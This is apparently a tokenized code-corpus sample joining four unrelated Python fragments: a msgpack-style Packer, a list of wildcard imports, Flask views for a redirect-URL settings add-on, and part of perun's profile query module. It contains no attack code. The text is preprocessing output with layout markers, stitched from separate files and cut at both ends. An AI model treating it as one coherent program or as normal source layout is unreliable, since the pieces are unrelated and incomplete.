exceeded" ) <newline> <dedent> if obj is None : <newline> <indent> return self . _buffer . write ( b"\xc0" ) <newline> <dedent> if isinstance ( obj , bool ) : <newline> <indent> if obj : <newline> <indent> return self . _buffer . write ( b"\xc3" ) <newline> <dedent> return self . _buffer . write ( b"\xc2" ) <newline> <dedent> if isinstance ( obj , int_types ) : <newline> <indent> if 0 <= obj < 0x80 : <newline> <indent> return self . _buffer . write ( struct . pack ( "B" , obj ) ) <newline> <dedent> if - 0x20 <= obj < 0 : <newline> <indent> return self . _buffer . write ( struct . pack ( "b" , obj ) ) <newline> <dedent> if 0x80 <= obj <= 0xff : <newline> <indent> return self . _buffer . write ( struct . pack ( "BB" , 0xcc , obj ) ) <newline> <dedent> if - 0x80 <= obj < 0 : <newline> <indent> return self . _buffer . write ( struct . pack ( ">Bb" , 0xd0 , obj ) ) <newline> <dedent> if 0xff < obj <= 0xffff : <newline> <indent> return self . _buffer . write ( struct . pack ( ">BH" , 0xcd , obj ) ) <newline> <dedent> if - 0x8000 <= obj < - 0x80 : <newline> <indent> return self . _buffer . write ( struct . pack ( ">Bh" , 0xd1 , obj ) ) <newline> <dedent> if 0xffff < obj <= 0xffffffff : <newline> <indent> return self . _buffer . write ( struct . pack ( ">BI" , 0xce , obj ) ) <newline> <dedent> if - 0x80000000 <= obj < - 0x8000 : <newline> <indent> return self . _buffer . write ( struct . pack ( ">Bi" , 0xd2 , obj ) ) <newline> <dedent> if 0xffffffff < obj <= 0xffffffffffffffff : <newline> <indent> return self . _buffer . write ( struct . pack ( ">BQ" , 0xcf , obj ) ) <newline> <dedent> if - 0x8000000000000000 <= obj < - 0x80000000 : <newline> <indent> return self . _buffer . write ( struct . pack ( ">Bq" , 0xd3 , obj ) ) <newline> <dedent> raise PackValueError ( "Integer ▁ value ▁ out ▁ of ▁ range" ) <newline> <dedent> if self . _use_bin_type and isinstance ( obj , bytes ) : <newline> <indent> n = len ( obj ) <newline> if n <= 0xff : <newline> <indent> self . _buffer . write ( struct . pack ( '>BB' , 0xc4 , n ) ) <newline> <dedent> elif n <= 0xffff : <newline> <indent> self . _buffer . write ( struct . pack ( ">BH" , 0xc5 , n ) ) <newline> <dedent> elif n <= 0xffffffff : <newline> <indent> self . _buffer . write ( struct . pack ( ">BI" , 0xc6 , n ) ) <newline> <dedent> else : <newline> <indent> raise PackValueError ( "Bytes ▁ is ▁ too ▁ large" ) <newline> <dedent> return self . _buffer . write ( obj ) <newline> <dedent> if isinstance ( obj , ( Unicode , bytes ) ) : <newline> <indent> if isinstance ( obj , Unicode ) : <newline> <indent> if self . _encoding is None : <newline> <indent> raise TypeError ( "Can't ▁ encode ▁ unicode ▁ string: ▁ " "no ▁ encoding ▁ is ▁ specified" ) <newline> <dedent> obj = obj . encode ( self . _encoding , self . _unicode_errors ) <newline> <dedent> n = len ( obj ) <newline> if n <= 0x1f : <newline> <indent> self . _buffer . write ( struct . pack ( 'B' , 0xa0 + n ) ) <newline> <dedent> elif self . _use_bin_type and n <= 0xff : <newline> <indent> self . _buffer . write ( struct . pack ( '>BB' , 0xd9 , n ) ) <newline> <dedent> elif n <= 0xffff : <newline> <indent> self . _buffer . write ( struct . pack ( ">BH" , 0xda , n ) ) <newline> <dedent> elif n <= 0xffffffff : <newline> <indent> self . _buffer . write ( struct . pack ( ">BI" , 0xdb , n ) ) <newline> <dedent> else : <newline> <indent> raise PackValueError ( "String ▁ is ▁ too ▁ large" ) <newline> <dedent> return self . _buffer . write ( obj ) <newline> <dedent> if isinstance ( obj , float ) : <newline> <indent> if self . _use_float : <newline> <indent> return self . _buffer . write ( struct . pack ( ">Bf" , 0xca , obj ) ) <newline> <dedent> return self . _buffer . write ( struct . pack ( ">Bd" , 0xcb , obj ) ) <newline> <dedent> if isinstance ( obj , ExtType ) : <newline> <indent> code = obj . code <newline> data = obj . data <newline> assert isinstance ( code , int ) <newline> assert isinstance ( data , bytes ) <newline> L = len ( data ) <newline> if L == 1 : <newline> <indent> self . _buffer . write ( b'\xd4' ) <newline> <dedent> elif L == 2 : <newline> <indent> self . _buffer . write ( b'\xd5' ) <newline> <dedent> elif L == 4 : <newline> <indent> self . _buffer . write ( b'\xd6' ) <newline> <dedent> elif L == 8 : <newline> <indent> self . _buffer . write ( b'\xd7' ) <newline> <dedent> elif L == 16 : <newline> <indent> self . _buffer . write ( b'\xd8' ) <newline> <dedent> elif L <= 0xff : <newline> <indent> self . _buffer . write ( struct . pack ( ">BB" , 0xc7 , L ) ) <newline> <dedent> elif L <= 0xffff : <newline> <indent> self . _buffer . write ( struct . pack ( ">BH" , 0xc8 , L ) ) <newline> <dedent> else : <newline> <indent> self . _buffer . write ( struct . pack ( ">BI" , 0xc9 , L ) ) <newline> <dedent> self . _buffer . write ( struct . pack ( "b" , code ) ) <newline> self . _buffer . write ( data ) <newline> return <newline> <dedent> if isinstance ( obj , ( list , tuple ) ) : <newline> <indent> n = len ( obj ) <newline> self . _fb_pack_array_header ( n ) <newline> for i in xrange ( n ) : <newline> <indent> self . _pack ( obj [ i ] , nest_limit - 1 ) <newline> <dedent> return <newline> <dedent> if isinstance ( obj , dict ) : <newline> <indent> return self . _fb_pack_map_pairs ( len ( obj ) , dict_iteritems ( obj ) , nest_limit - 1 ) <newline> <dedent> if not default_used and self . _default is not None : <newline> <indent> obj = self . _default ( obj ) <newline> default_used = 1 <newline> continue <newline> <dedent> raise TypeError ( "Cannot ▁ serialize ▁ %r" % obj ) <newline> <dedent> <dedent> def pack ( self , obj ) : <newline> <indent> self . _pack ( obj ) <newline> ret = self . _buffer . getvalue ( ) <newline> if self . _autoreset : <newline> <indent> self . _buffer = StringIO ( ) <newline> <dedent> elif USING_STRINGBUILDER : <newline> <indent> self . _buffer = StringIO ( ret ) <newline> <dedent> return ret <newline> <dedent> def pack_map_pairs ( self , pairs ) : <newline> <indent> self . _fb_pack_map_pairs ( len ( pairs ) , pairs ) <newline> ret = self . _buffer . getvalue ( ) <newline> if self . _autoreset : <newline> <indent> self . _buffer = StringIO ( ) <newline> <dedent> elif USING_STRINGBUILDER : <newline> <indent> self . _buffer = StringIO ( ret ) <newline> <dedent> return ret <newline> <dedent> def pack_array_header ( self , n ) : <newline> <indent> if n >= 2 ** 32 : <newline> <indent> raise ValueError <newline> <dedent> self . _fb_pack_array_header ( n ) <newline> ret = self . _buffer . getvalue ( ) <newline> if self . _autoreset : <newline> <indent> self . _buffer = StringIO ( ) <newline> <dedent> elif USING_STRINGBUILDER : <newline> <indent> self . _buffer = StringIO ( ret ) <newline> <dedent> return ret <newline> <dedent> def pack_map_header ( self , n ) : <newline> <indent> if n >= 2 ** 32 : <newline> <indent> raise ValueError <newline> <dedent> self . _fb_pack_map_header ( n ) <newline> ret = self . _buffer . getvalue ( ) <newline> if self . _autoreset : <newline> <indent> self . _buffer = StringIO ( ) <newline> <dedent> elif USING_STRINGBUILDER : <newline> <indent> self . _buffer = StringIO ( ret ) <newline> <dedent> return ret <newline> <dedent> def pack_ext_type ( self , typecode , data ) : <newline> <indent> if not isinstance ( typecode , int ) : <newline> <indent> raise TypeError ( "typecode ▁ must ▁ have ▁ int ▁ type." ) <newline> <dedent> if not 0 <= typecode <= 127 : <newline> <indent> raise ValueError ( "typecode ▁ should ▁ be ▁ 0-127" ) <newline> <dedent> if not isinstance ( data , bytes ) : <newline> <indent> raise TypeError ( "data ▁ must ▁ have ▁ bytes ▁ type" ) <newline> <dedent> L = len ( data ) <newline> if L > 0xffffffff : <newline> <indent> raise ValueError ( "Too ▁ large ▁ data" ) <newline> <dedent> if L == 1 : <newline> <indent> self . _buffer . write ( b'\xd4' ) <newline> <dedent> elif L == 2 : <newline> <indent> self . _buffer . write ( b'\xd5' ) <newline> <dedent> elif L == 4 : <newline> <indent> self . _buffer . write ( b'\xd6' ) <newline> <dedent> elif L == 8 : <newline> <indent> self . _buffer . write ( b'\xd7' ) <newline> <dedent> elif L == 16 : <newline> <indent> self . _buffer . write ( b'\xd8' ) <newline> <dedent> elif L <= 0xff : <newline> <indent> self . _buffer . write ( b'\xc7' + struct . pack ( 'B' , L ) ) <newline> <dedent> elif L <= 0xffff : <newline> <indent> self . _buffer . write ( b'\xc8' + struct . pack ( '>H' , L ) ) <newline> <dedent> else : <newline> <indent> self . _buffer . write ( b'\xc9' + struct . pack ( '>I' , L ) ) <newline> <dedent> self . _buffer . write ( struct . pack ( 'B' , typecode ) ) <newline> self . _buffer . write ( data ) <newline> <dedent> def _fb_pack_array_header ( self , n ) : <newline> <indent> if n <= 0x0f : <newline> <indent> return self . _buffer . write ( struct . pack ( 'B' , 0x90 + n ) ) <newline> <dedent> if n <= 0xffff : <newline> <indent> return self . _buffer . write ( struct . pack ( ">BH" , 0xdc , n ) ) <newline> <dedent> if n <= 0xffffffff : <newline> <indent> return self . _buffer . write ( struct . pack ( ">BI" , 0xdd , n ) ) <newline> <dedent> raise PackValueError ( "Array ▁ is ▁ too ▁ large" ) <newline> <dedent> def _fb_pack_map_header ( self , n ) : <newline> <indent> if n <= 0x0f : <newline> <indent> return self . _buffer . write ( struct . pack ( 'B' , 0x80 + n ) ) <newline> <dedent> if n <= 0xffff : <newline> <indent> return self . _buffer . write ( struct . pack ( ">BH" , 0xde , n ) ) <newline> <dedent> if n <= 0xffffffff : <newline> <indent> return self . _buffer . write ( struct . pack ( ">BI" , 0xdf , n ) ) <newline> <dedent> raise PackValueError ( "Dict ▁ is ▁ too ▁ large" ) <newline> <dedent> def _fb_pack_map_pairs ( self , n , pairs , nest_limit = DEFAULT_RECURSE_LIMIT ) : <newline> <indent> self . _fb_pack_map_header ( n ) <newline> for ( k , v ) in pairs : <newline> <indent> self . _pack ( k , nest_limit - 1 ) <newline> self . _pack ( v , nest_limit - 1 ) <newline> <dedent> <dedent> def bytes ( self ) : <newline> <indent> return self . _buffer . getvalue ( ) <newline> <dedent> def reset ( self ) : <newline> <indent> self . _buffer = StringIO ( ) <newline> <dedent> <dedent>
from core import * <newline> from roles import * <newline> from org import * <newline> from hrm import * <newline> from inv import * <newline> from asset import * <newline> from project import * <newline> from smoke import * <newline> from member import * <newline> from volunteer import * <newline> from staff import * <newline>
 """ Views ▁ for ▁ the ▁ node ▁ settings ▁ page. """  <newline>  # ▁ -*- ▁ coding: ▁ utf-8 ▁ -*- <encdom> import httplib as http <newline> from flask import request <newline> from modularodm . exceptions import ValidationError <newline> from framework . exceptions import HTTPError <newline> from website . project . decorators import ( must_have_addon , must_have_permission , must_not_be_registration , must_be_valid_project ) <newline> from website . addons . forward . utils import serialize_settings <newline> @ must_be_valid_project <newline> @ must_have_addon ( 'forward' , 'node' ) <newline> def forward_config_get ( node_addon , ** kwargs ) : <newline> <indent> return serialize_settings ( node_addon ) <newline> <dedent> @ must_have_permission ( 'write' ) <newline> @ must_not_be_registration <newline> @ must_have_addon ( 'forward' , 'node' ) <newline> def forward_config_put ( auth , node_addon , ** kwargs ) : <newline> <indent>  """ Set ▁ configuration ▁ for ▁ forward ▁ node ▁ settings, ▁ adding ▁ a ▁ log ▁ if ▁ URL ▁ has <strnewline> ▁ changed. <strnewline> <strnewline> ▁ :param-json ▁ str ▁ url: ▁ Forward ▁ URL <strnewline> ▁ :param-json ▁ bool ▁ redirectBool: ▁ Auto-redirect <strnewline> ▁ :param-json ▁ int ▁ redirectSecs: ▁ Auto-redirect ▁ timeout <strnewline> ▁ :raises: ▁ HTTPError(400) ▁ if ▁ values ▁ missing ▁ or ▁ invalid <strnewline> <strnewline> ▁ """  <newline> try : <newline> <indent> node_addon . url = request . json [ 'url' ] <newline> node_addon . label = request . json . get ( 'label' ) <newline> node_addon . redirect_bool = request . json [ 'redirectBool' ] <newline> node_addon . redirect_secs = int ( request . json [ 'redirectSecs' ] ) <newline> <dedent> except ( KeyError , TypeError , ValueError ) : <newline> <indent> raise HTTPError ( http . BAD_REQUEST ) <newline>  # ▁ Save ▁ settings ▁ and ▁ get ▁ changed ▁ fields; ▁ crash ▁ if ▁ validation ▁ fails <encdom> <dedent> try : <newline> <indent> saved_fields = node_addon . save ( ) <newline> <dedent> except ValidationError : <newline> <indent> raise HTTPError ( http . BAD_REQUEST ) <newline>  # ▁ Log ▁ change ▁ if ▁ URL ▁ updated <encdom> <dedent> if 'url' in saved_fields : <newline> <indent> node_addon . owner . add_log ( action = 'forward_url_changed' , params = dict ( node = node_addon . owner . _id , project = node_addon . owner . parent_id , forward_url = node_addon . url , ) , auth = auth , save = True , ) <newline> <dedent> return { } <newline> <dedent>
 """ ``perun.profile.query`` ▁ is ▁ a ▁ module ▁ which ▁ specifies ▁ interface ▁ for ▁ issuing <strnewline> queries ▁ over ▁ the ▁ profiles ▁ w.r.t ▁ :ref:`profile-spec`. <strnewline> <strnewline> .. ▁ _Pandas ▁ library: ▁ https://docs.python.org/3.7/library/json.html <strnewline> <strnewline> Run ▁ the ▁ following ▁ in ▁ the ▁ Python ▁ interpreter ▁ to ▁ extend ▁ the ▁ capabilities ▁ of <strnewline> profile ▁ to ▁ query ▁ over ▁ profiles, ▁ iterate ▁ over ▁ resources ▁ or ▁ models, ▁ etc.:: <strnewline> <strnewline> ▁ import ▁ perun.profile.query <strnewline> <strnewline> Combined ▁ with ▁ ``perun.profile.factory``, ▁ ``perun.profile.convert`` ▁ and ▁ e.g. <strnewline> `Pandas ▁ library`_ ▁ one ▁ can ▁ obtain ▁ efficient ▁ interpreter ▁ for ▁ executing ▁ more <strnewline> complex ▁ queries ▁ and ▁ statistical ▁ tests ▁ over ▁ the ▁ profiles. <strnewline> <strnewline> <strnewline> """  <newline> import operator <newline> import numbers <newline> import perun . utils . helpers as helpers <newline> __author__ = 'Tomas ▁ Fiedor' <newline> __coauthored__ = "Jiri ▁ Pavela" <newline> def flattened_values ( root_key , root_value ) : <newline> <indent>  """ Converts ▁ the ▁ (root_key, ▁ root_value) ▁ pair ▁ to ▁ something ▁ that ▁ can ▁ be ▁ added ▁ to ▁ table. <strnewline> <strnewline> ▁ Flattens ▁ all ▁ of ▁ the ▁ dictionaries ▁ to ▁ single ▁ level ▁ and ▁ <key>(:<key>)? ▁ values, ▁ lists ▁ are ▁ processed <strnewline> ▁ to ▁ comma ▁ separated ▁ representation ▁ and ▁ rest ▁ is ▁ left ▁ as ▁ it ▁ is. <strnewline> <strnewline> ▁ :param ▁ str ▁ or ▁ int ▁ root_key: ▁ name ▁ (or ▁ index) ▁ of ▁ the ▁ processed ▁ key, ▁ that ▁ is ▁ going ▁ to ▁ be ▁ flattened <strnewline> ▁ :param ▁ object ▁ root_value: ▁ value ▁ that ▁ is ▁ flattened <strnewline> ▁ :returns ▁ (key, ▁ object): ▁ either ▁ decimal, ▁ string, ▁ or ▁ something ▁ else <strnewline> ▁ """  <newline>  # ▁ Dictionary ▁ is ▁ processed ▁ recursively ▁ according ▁ to ▁ the ▁ all ▁ items ▁ that ▁ are ▁ nested <encdom> if isinstance ( root_value , dict ) : <newline> <indent> nested_values = [ ] <newline> for key , value in all_items_of ( root_value ) : <newline>  # ▁ Add ▁ one ▁ level ▁ of ▁ hierarchy ▁ with ▁':' <encdom> <indent> nested_values . append ( ( key , value ) ) <newline> yield str ( root_key ) + ":" + key , value <newline>  # ▁ Additionally ▁ return ▁ the ▁ overall ▁ key ▁ as ▁ joined ▁ values ▁ of ▁ its ▁ nested ▁ stuff, <encdom>  # ▁ only ▁ if ▁ root ▁ is ▁ not ▁ a ▁ list ▁ (i.e. ▁ root ▁ key ▁ is ▁ not ▁ int ▁ = ▁ index)! <encdom> <dedent> if isinstance ( root_key , str ) : <newline> <indent> nested_values . sort ( key = helpers . uid_getter ) <newline> yield root_key , ":" . join ( map ( str , map ( operator . itemgetter ( 1 ) , nested_values ) ) ) <newline>  # ▁ Lists ▁ that ▁ represent ▁ variable ▁ length ▁ dictionary <encdom> <dedent> <dedent> elif helpers . is_variable_len_dict ( root_value ) : <newline> <indent> dictionary = { v [ 'name' ] : v [ 'value' ] for v in root_value } <newline> yield from flattened_values ( root_key , dictionary ) <newline>  # ▁ Lists ▁ are ▁ merged ▁ as ▁ comma ▁ separated ▁ keys <encdom> <dedent> elif isinstance ( root_value , list ) : <newline> <indent> yield root_key , ',' . join ( ":" . join ( str ( nested_value [ 1 ] ) for nested_value in flattened_values ( i , lv ) ) for ( i , lv ) in enumerate ( root_value ) ) <newline>  # ▁ Rest ▁ of ▁ the ▁ values ▁ are ▁ left ▁ as ▁ they ▁ are <encdom> <dedent> else : <newline> <indent> yield root_key , root_value <newline> <dedent> <dedent> def all_items_of ( resource ) : <newline> <indent>  """ Generator ▁ for ▁ iterating ▁ through ▁ all ▁ of ▁ the ▁ flattened ▁ items ▁ contained <strnewline> ▁ inside ▁ the ▁ resource ▁ w.r.t ▁ :pkey:`resources` ▁ specification. <strnewline> <strnewline> ▁ Generator ▁ iterates ▁ through ▁ all ▁ of ▁ the ▁ items ▁ contained ▁ in ▁ the ▁ `resource` ▁ in <strnewline> ▁ flattened ▁ form ▁ (i.e. ▁ it ▁ does ▁ not ▁ contain ▁ nested ▁ dictionaries). ▁ Resources <strnewline> ▁ should ▁ be ▁ w.r.t ▁ :pkey:`resources` ▁ specification. <strnewline> <strnewline> ▁ E.g. ▁ the ▁ following ▁ resource: <strnewline> <strnewline> ▁ .. ▁ code-block:: ▁ json <strnewline> <strnewline> ▁ { <strnewline> ▁"type": ▁"memory", <strnewline> ▁"amount": ▁ 4, <strnewline> ▁"uid": ▁ { <strnewline> ▁"source": ▁"../memory_collect_test.c", <strnewline> ▁"function": ▁"main", <strnewline> ▁"line": ▁ 22 <strnewline> ▁ } <strnewline> ▁ } <strnewline> <strnewline> ▁ yields ▁ the ▁ following ▁ stream ▁ of ▁ resources:: <strnewline> <strnewline> ▁ ("type", ▁"memory") <strnewline> ▁ ("amount", ▁ 4) <strnewline> ▁ ("uid", ▁"../memory_collect_test.c:main:22") <strnewline> ▁ ("uid:source", ▁"../memory_collect_test.c") <strnewline> ▁ ("uid:function", ▁"main") <strnewline> ▁ ("uid:line": ▁ 22) <strnewline> <strnewline> ▁ :param ▁ dict ▁ resource: ▁ dictionary ▁ representing ▁ one ▁ resource <strnewline> ▁ w.r.t ▁ :pkey:`resources` <strnewline> ▁ :returns: ▁ iterable ▁ stream ▁ of ▁ ``(str, ▁ value)`` ▁ pairs, ▁ where ▁ the ▁ ``value`` ▁ is <strnewline> ▁ flattened ▁ to ▁ either ▁ a ▁ `string`, ▁ or ▁ `decimal` ▁ representation ▁ and ▁ ``str`` <strnewline> ▁ corresponds ▁ to ▁ the ▁ key ▁ of ▁ the ▁ item <strnewline> ▁ """  <newline> for key , value in resource . items ( ) : <newline> <indent> for flattened_key , flattened_value in flattened_values ( key , value ) : <newline> <indent> yield flattened_key , flattened_value <newline> <dedent> <dedent> <dedent> def all_resource_fields_of ( profile ) : <newline> <indent>  """ Generator ▁ for ▁ iterating ▁ through ▁ all ▁ of ▁ the ▁ fields ▁ (both ▁ flattened ▁ and <strnewline> ▁ original) ▁ that ▁ are ▁ occurring ▁ in ▁ the ▁ resources. <strnewline> <strnewline> ▁ E.g. ▁ considering ▁ the ▁ example ▁ profiles ▁ from ▁ :pkey:`resources`, ▁ the ▁ function <strnewline> ▁ yields ▁ the ▁ following ▁ for ▁ `memory`, ▁ `time` ▁ and ▁ `trace` ▁ profiles <strnewline> ▁ respectively ▁ (considering ▁ we ▁ convert ▁ the ▁ stream ▁ to ▁ list):: <strnewline> <strnewline> ▁ memory_resource_fields ▁ = ▁ [ <strnewline> ▁'type', ▁'address', ▁'amount', ▁'uid:function', ▁'uid:source', <strnewline> ▁'uid:line', ▁'uid', ▁'trace', ▁'subtype' <strnewline> ▁ ] <strnewline> ▁ time_resource_fields ▁ = ▁ [ <strnewline> ▁'type', ▁'amount', ▁'uid' <strnewline> ▁ ] <strnewline> ▁ complexity_resource_fields ▁ = ▁ [ <strnewline> ▁'type', ▁'amount', ▁'structure-unit-size', ▁'subtype', ▁'uid' <strnewline> ▁ ] <strnewline> <strnewline> ▁ :param ▁ Profile ▁ profile: ▁ performance ▁ profile ▁ w.r.t ▁ :ref:`profile-spec` <strnewline> ▁ :returns: ▁ iterable ▁ stream ▁ of ▁ resource ▁ field ▁ keys ▁ represented ▁ as ▁ `str` <strnewline> ▁ """  <newline> yield from _all_fields_of ( profile . all_resources ) <newline> <dedent> def all_model_fields_of ( profile ) : <newline> <indent>  """ Generator ▁ for ▁ iterating ▁ through ▁ all ▁ of ▁ the ▁ fields ▁ (both ▁ flattened ▁ and <strnewline> ▁ original) ▁ that ▁ are ▁ occurring ▁ in ▁ the ▁ models. <strnewline> <strnewline> ▁ E.g. ▁ considering ▁ the ▁ example ▁ profiles ▁ from ▁ :ref:`postprocessors-regression-analysis`, ▁ the ▁ function <strnewline> ▁ yields ▁ the ▁ following ▁ model ▁ keys: <strnewline> <strnewline> ▁ model_keys ▁ = ▁ ['coeffs:b1', ▁'coeffs:b0', ▁'coeffs', ▁'r_square', ▁'x_interval_end', ▁'model', ▁'method', ▁'uid', ▁'x_interval_start', ▁'coeffs:b2'] <strnewline> ▁ memory_resource_fields ▁ = ▁ [ <strnewline> ▁'type', ▁'address', ▁'amount', ▁'uid:function', ▁'uid:source', <strnewline> ▁'uid:line', ▁'uid', ▁'trace', ▁'subtype' <strnewline> ▁ ] <strnewline> <strnewline> ▁ :param ▁ Profile ▁ profile: ▁ performance ▁ profile ▁ w.r.t ▁ :ref:`profile-spec` <strnewline> ▁ :returns: ▁ iterable ▁ stream ▁ of ▁ model ▁ field ▁ keys ▁ represented ▁ as ▁ `str` <strnewline> ▁ """  <newline> yield from _all_fields_of ( profile . all_models ) <newline> <dedent> def _all_fields_of ( item_generator ) : <newline> <indent>  """ Helper ▁ generator ▁ for ▁ iterating ▁ through ▁ all ▁ of ▁ the ▁ fields ▁ generated ▁ by ▁ the ▁ item_generator <strnewline> <strnewline> ▁ Generator ▁ iterates ▁ through ▁ all ▁ of ▁ the ▁ resources ▁ and ▁ checks ▁ their ▁ flattened <strnewline> ▁ keys. ▁ In ▁ case ▁ some ▁ of ▁ the ▁ keys ▁ were ▁ not ▁ yet ▁ processed, ▁ they ▁ are ▁ yielded. <strnewline> <strnewline> ▁ :param ▁ iterable ▁ item_generator: ▁ iterable ▁ stream ▁ of ▁ items <strnewline> ▁ :return: ▁ iterable ▁ stream ▁ of ▁ field ▁ keys ▁ represented ▁ as ▁ `str` <strnewline> ▁ """  <newline> resource_fields = set ( ) <newline> for ( _ , resource ) in item_generator ( ) : <newline> <indent> for key , __ in all_items_of ( resource ) : <newline> <indent> if key not in resource_fields : <newline> <indent> resource_fields . add ( key ) <newline> yield key <newline> <dedent> <dedent> <dedent> <dedent> def all_numerical_resource_fields_of ( profile ) : <newline> <indent>  """ Generator ▁ for ▁ iterating ▁ through ▁ all ▁ of ▁ the ▁ fields ▁ (both ▁ flattened ▁ and <strnewline> ▁ original) ▁ that ▁ are ▁ occuring ▁ in ▁ the ▁ resources ▁ and ▁ takes ▁ as ▁ domain ▁ integer <strnewline> ▁ values. <strnewline> <strnewline> ▁ Generator ▁ iterates ▁ through ▁ all ▁ of ▁ the ▁ resources ▁ and ▁ checks ▁ their ▁ flattened <strnewline> ▁ keys ▁ and ▁ yields ▁ them ▁ in ▁ case ▁ they ▁ were ▁ not ▁ yet ▁ processed. ▁ If ▁ the ▁ instance <strnewline> ▁ of ▁ the ▁ key ▁ does ▁ not ▁ contain ▁ integer ▁ values, ▁ it ▁ is ▁ skipped. <strnewline> <strnewline> ▁ E.g. ▁ considering ▁ the ▁ example ▁ profiles ▁ from ▁ :pkey:`resources`, ▁ the ▁ function <strnewline> ▁ yields ▁ the ▁ following ▁ for ▁ `memory`, ▁ `time` ▁ and ▁ `trace` ▁ profiles <strnewline> ▁ respectively ▁ (considering ▁ we ▁ convert ▁ the ▁ stream ▁ to ▁ list):: <strnewline> <strnewline> ▁ memory_num_resource_fields ▁ = ▁ ['address', ▁'amount', ▁'uid:line'] <strnewline> ▁ time_num_resource_fields ▁ = ▁ ['amount'] <strnewline> ▁ complexity_num_resource_fields ▁ = ▁ ['amount', ▁'structure-unit-size'] <strnewline> <strnewline> ▁ :param ▁ Profile ▁ profile: ▁ performance ▁ profile ▁ w.r.t ▁ :ref:`profile-spec` <strnewline> ▁ :returns: ▁ iterable ▁ stream ▁ of ▁ resource ▁ fields ▁ key ▁ as ▁ `str`, ▁ that ▁ takes <strnewline> ▁ integer ▁ values <strnewline> ▁ """  <newline> resource_fields = set ( ) <newline> exclude_fields = set ( ) <newline> for ( _ , resource ) in profile . all_resources ( ) : <newline> <indent> for key , value in all_items_of ( resource ) : <newline>  # ▁ Instances ▁ that ▁ are ▁ not ▁ numbers ▁ are ▁ removed ▁ from ▁ the ▁ resource ▁ fields ▁ (i.e. ▁ there ▁ was <encdom>  # ▁ some ▁ inconsistency ▁ between ▁ value) ▁ and ▁ added ▁ to ▁ exclude ▁ for ▁ future ▁ usages <encdom> <indent> if not isinstance ( value , numbers . Number ) : <newline> <indent> resource_fields . discard ( value ) <newline> exclude_fields . add ( value ) <newline>  # ▁ If ▁ we ▁ previously ▁ encountered ▁ incorrect ▁ non-numeric ▁ value ▁ for ▁ the ▁ key, ▁ we ▁ do ▁ not ▁ add <encdom>  # ▁ it ▁ as ▁ a ▁ numeric ▁ key <encdom> <dedent> elif value not in exclude_fields : <newline> <indent> resource_fields . add ( key ) <newline>  # ▁ Yield ▁ the ▁ stream ▁ of ▁ the ▁ keys <encdom> <dedent> <dedent> <dedent> for key in resource_fields : <newline> <indent> yield key <newline> <dedent> <dedent> def unique_resource_values_of ( profile , resource_key ) : <newline> <indent>  """ Generator ▁ of ▁ all ▁ unique ▁ key ▁ values ▁ occurring ▁ in ▁ the ▁ resources, ▁ w.r.t. <strnewline> ▁ :pkey:`resources` ▁ specification ▁ of ▁ resources. <strnewline> <strnewline> ▁ Iterates ▁ through ▁ all ▁ of ▁ the ▁ values ▁ of ▁ given ▁ ``resource_keys`` ▁ and ▁ yields <strnewline> ▁ only ▁ unique ▁ values. ▁ Note ▁ that ▁ the ▁ key ▁ can ▁ contain ▁':' ▁ symbol ▁ indicating <strnewline> ▁ another ▁ level ▁ of ▁ dictionary ▁ hierarchy ▁ or ▁'::' ▁ for ▁ specifying ▁ keys ▁ in ▁ list <strnewline> ▁ or ▁ set ▁ level, ▁ e.g. ▁ in ▁ case ▁ of ▁ `traces` ▁ one ▁ uses ▁ ``trace::function``. <strnewline> <strnewline> ▁ E.g. ▁ considering ▁ the ▁ example ▁ profiles ▁ from ▁ :pkey:`resources`, ▁ the ▁ function <strnewline> ▁ yields ▁ the ▁ following ▁ for ▁ `memory`, ▁ `time` ▁ and ▁ `trace` ▁ profiles ▁ stored <strnewline> ▁ in ▁ variables ▁ ``mprof``, ▁ ``tprof`` ▁ and ▁ ``cprof`` ▁ respectively:: <strnewline> <strnewline> ▁ >>> ▁ list(query.unique_resource_values_of(mprof, ▁'subtype') <strnewline> ▁ ['malloc', ▁'free'] <strnewline> ▁ >>> ▁ list(query.unique_resource_values_of(tprof, ▁'amount') <strnewline> ▁ [0.616, ▁ 0.500, ▁ 0.125] <strnewline> ▁ >>> ▁ list(query.unique_resource_values_of(cprof, ▁'uid') <strnewline> ▁ ['SLList_init(SLList*)', ▁'SLList_search(SLList*, ▁ int)', <strnewline> ▁'SLList_insert(SLList*, ▁ int)', ▁'SLList_destroy(SLList*)'] <strnewline> <strnewline> ▁ :param ▁ Profile ▁ profile: ▁ performance ▁ profile ▁ w.r.t ▁ :ref:`profile-spec` <strnewline> ▁ :param ▁ str ▁ resource_key: ▁ the ▁ resources ▁ key ▁ identifier ▁ whose ▁ unique ▁ values <strnewline> ▁ will ▁ be ▁ iterated <strnewline> ▁ :returns: ▁ iterable ▁ stream ▁ of ▁ unique ▁ resource ▁ key ▁ values <strnewline> ▁ """  <newline> for value in _unique_values_generator ( resource_key , profile . all_resources ) : <newline> <indent> yield value <newline> <dedent> <dedent> def all_key_values_of ( resource , resource_key ) : <newline> <indent>  """ Generator ▁ of ▁ all ▁ (not ▁ essentially ▁ unique) ▁ key ▁ values ▁ in ▁ resource, ▁ w.r.t <strnewline> ▁ :pkey:`resources` ▁ specification ▁ of ▁ resources. <strnewline> <strnewline> ▁ Iterates ▁ through ▁ all ▁ of ▁ the ▁ values ▁ of ▁ given ▁ ``resource_key`` ▁ and ▁ yields <strnewline> ▁ every ▁ value ▁ it ▁ finds. ▁ Note ▁ that ▁ the ▁ key ▁ can ▁ contain ▁':' ▁ symbol ▁ indicating <strnewline> ▁ another ▁ level ▁ of ▁ dictionary ▁ hierarchy ▁ or ▁'::' ▁ for ▁ specifying ▁ keys ▁ in ▁ list <strnewline> ▁ or ▁ set ▁ level, ▁ e.g. ▁ in ▁ case ▁ of ▁ `traces` ▁ one ▁ uses ▁ ``trace::function``. <strnewline> <strnewline> ▁ E.g. ▁ considering ▁ the ▁ example ▁ profiles ▁ from ▁ :pkey:`resources` ▁ and ▁ the <strnewline> ▁ resources ▁ ``mres`` ▁ from ▁ the ▁ profile ▁ of ▁ `memory` ▁ type, ▁ we ▁ can ▁ obtain ▁ all ▁ of <strnewline> ▁ the ▁ values ▁ of ▁ ``trace::function`` ▁ key ▁ as ▁ follows:: <strnewline> <strnewline> ▁ >>> ▁ query.all_key_values_of(mres, ▁'trace::function') <strnewline> ▁ ['free', ▁'main', ▁'__libc_start_main', ▁'_start'] <strnewline> <strnewline> ▁ Note ▁ that ▁ this ▁ is ▁ mostly ▁ useful ▁ for ▁ iterating ▁ through ▁ list ▁ or ▁ nested <strnewline> ▁ dictionaries. <strnewline> <strnewline> ▁ :param ▁ dict ▁ resource: ▁ dictionary ▁ representing ▁ one ▁ resource <strnewline> ▁ 